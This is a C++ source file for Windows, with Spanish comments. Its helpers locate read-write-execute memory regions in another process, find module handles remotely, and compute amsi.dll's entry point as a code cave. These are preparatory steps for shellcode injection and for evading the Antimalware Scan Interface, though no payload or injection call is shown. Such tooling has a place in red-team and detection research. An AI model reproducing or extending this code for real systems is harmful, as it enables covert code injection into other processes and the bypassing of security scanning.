#include "RWXFinder.h"
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <strsafe.h>
//#include <winternl.h>

#pragma comment(lib, "Shlwapi.lib")

#include <windows.h>
#include <stdio.h>


LPVOID FindRWX(HANDLE hndl, SIZE_T size){
    MEMORY_BASIC_INFORMATION mbi = { 0 };
    LPVOID addr = nullptr;

    while (VirtualQueryEx(hndl, addr, &mbi, sizeof(mbi)) == sizeof(mbi))
    {
        if (mbi.State == MEM_COMMIT &&
            mbi.Type == MEM_PRIVATE &&
            mbi.Protect == PAGE_EXECUTE_READWRITE)
        {
            if (mbi.RegionSize >= size)
            {
                printf("[+] Found suitable RWX region:\n"
                    "    BaseAddress : 0x%llX\n"
                    "    RegionSize  : %llu bytes (%.2f KB)\n\n",
                    (ULONG_PTR)mbi.BaseAddress,
                    mbi.RegionSize,
                    mbi.RegionSize / 1024.0);

                return mbi.BaseAddress;   
            }
            else
            {
                printf("[-] Small RWX region skipped: 0x%llX (%llu bytes)\n",
                    (ULONG_PTR)mbi.BaseAddress, mbi.RegionSize);
            }
        }
        addr = (LPVOID)((BYTE*)mbi.BaseAddress + mbi.RegionSize);
    }
    printf("[!] No RWX region >= %zu bytes found.\n", size);
    return nullptr;
}

HMODULE GetRemoteModuleHandle(HANDLE hProcess, const char* moduleName) {
    HMODULE hMods[1024];
    DWORD cbNeeded;

    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            char szModName[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName))) {
                // Extraer solo el nombre del archivo
                char* fileName = strrchr(szModName, '\\');
                fileName = fileName ? fileName + 1 : szModName;

                if (_stricmp(fileName, moduleName) == 0) {
                    return hMods[i];
                }
            }
        }
    }
    return nullptr;
}


LPVOID GetAmsiEntryPointCave(HANDLE hProcess, HMODULE hRemoteAmsi) {
    MODULEINFO modInfo;
    if (!GetModuleInformation(hProcess, hRemoteAmsi, &modInfo, sizeof(modInfo))) {
        return nullptr;
    }

    // Cargamos amsi.dll en NUESTRO proceso para leer sus headers locales
    HMODULE hLocalAmsi = LoadLibraryA("amsi.dll");
    if (!hLocalAmsi) {
        return nullptr;
    }

    // Obtener el AddressOfEntryPoint (RVA del punto de entrada del DLLMain)
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hLocalAmsi;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hLocalAmsi + dosHeader->e_lfanew);
    DWORD entryRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;

    FreeLibrary(hLocalAmsi);

    if (entryRVA == 0) {
        return nullptr; // Algunas versiones tienen entry point en 0
    }

    // Dirección remota: base remota + RVA del entry point
    LPVOID remoteEntry = (LPVOID)((BYTE*)hRemoteAmsi + entryRVA);

    return remoteEntry;
}